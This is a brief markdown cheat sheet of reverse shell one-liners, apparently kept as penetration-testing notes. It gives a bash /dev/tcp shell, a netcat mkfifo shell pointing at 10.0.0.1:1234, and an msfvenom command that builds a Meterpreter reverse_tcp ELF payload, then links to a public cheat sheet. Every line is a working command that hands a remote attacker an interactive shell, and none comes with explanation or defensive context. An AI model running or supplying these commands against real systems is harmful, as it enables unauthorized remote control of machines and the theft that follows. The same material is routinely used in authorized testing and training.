# Reverse Shells

## Bash
`bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1`


# Netcat

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.xx.xx.xx LPORT=4443 -f elf -o mt.bin


https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet